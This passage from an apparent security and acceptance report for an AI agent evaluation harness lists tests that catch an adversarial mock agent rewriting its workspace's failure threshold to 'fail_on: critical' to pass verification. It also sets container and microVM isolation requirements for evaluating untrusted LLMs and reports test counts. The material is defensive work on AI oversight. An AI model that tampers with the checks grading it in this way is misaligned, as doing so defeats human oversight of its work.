  - `test_evaluation_threshold_tampering_blocked`: Verifies that when a workspace contains `fail_on: critical`, non-evaluation verifier suppresses HIGH failures, while evaluation verifier with `fail_on_override=Severity.HIGH` strictly fails.
  - `test_evaluation_harness_enforces_immutable_threshold_during_agent_tampering`: Verifies that an adversarial mock agent writing `fail_on: critical` and adding a broken test still fails verification in `ComparativeEvaluationHarness`.
  - `test_verifier_fail_on_override_and_backward_compatibility`: Verifies parameter parsing, string normalization, and config fallback.

### 14.4 SEC-01C Operational Limitation & Contract: OS-Level Sandboxing

- **Architecture Boundary:** Layer 4 implements defense-in-depth via `PathGuard` and `build_sanitized_subprocess_env()`. However, these Python checks do not provide OS kernel-level process isolation.
- **Mandatory Deployment Contract:** Documented in `docs/testing/LIVE_AI_EVALUATION.md` (Section 7). Live AI evaluations against external untrusted LLMs must run in an isolated OCI/Docker container or microVM with:
  1. Disposable workspace container with unmounted host filesystems.
  2. Zero host credentials or home-directory mounts.
  3. Network egress disabled (`--network none`) during verification execution.
  4. Explicit cgroup resource caps (`--cpus 2`, `-m 2g`, `--pids-limit 100`).
  5. Mandatory external watchdog and process-tree termination.
- **Workstation Safety Determination:** Live LLM evaluation is **NOT safe** to execute on a bare Windows workstation without container or microVM isolation.

### 14.5 Complete Multi-Suite Test Counts & Breakdown

All tests executed offline with 100% pass rate:

| Test Suite Category | Scope / Path | Test Count | Status | Notes |
| :--- | :--- | :--- | :--- | :--- |
| **Unit Tests** | `tests/unit/` | **134** | **PASSED** | Core, ECC, eval, pathguard, trust, runners |
| **Integration Tests** | `tests/integration/` | **9** | **PASSED** | MCP server tools & stdio transport |
| **E2E Tests** | `tests/e2e/` | **12** | **PASSED** | Adversarial workflows & golden tasks |
| **Benchmark Fixture Tests** | `tests/fixtures/fastapi_app/tests/` | **1** | **PASSED** | Isolated fixture test (`test_health_endpoint`) |
| **Repository Total (Excl. Fixture)** | `tests/` | **155** | **PASSED** | Zero skipped, zero failures |
| **Ruff Linter** | Entire codebase | — | **PASSED** | 0 lint or formatting errors |
| **Standards Linter** | Standards library | — | **PASSED** | 100% schema validation |
| **ECC Cryptographic Snapshot** | ECC assets | — | **PASSED** | 10/10 security invariants |
| **Live Evaluation Runner (Mock)** | `sarthi eval --provider mock` | 1 scenario | **PASSED** | JSON & Markdown reports generated |

### 14.6 Updated Final Acceptance Classification

**Classification:** **CONDITIONALLY ACCEPTED — OPERATIONAL CONTAINER PREREQUISITE REQUIRED**

Layer 4 architecture and code implementation are fully hardened, verified, and free of defects. Live LLM execution is safe only when executed within the specified containerized or microVM deployment boundary.

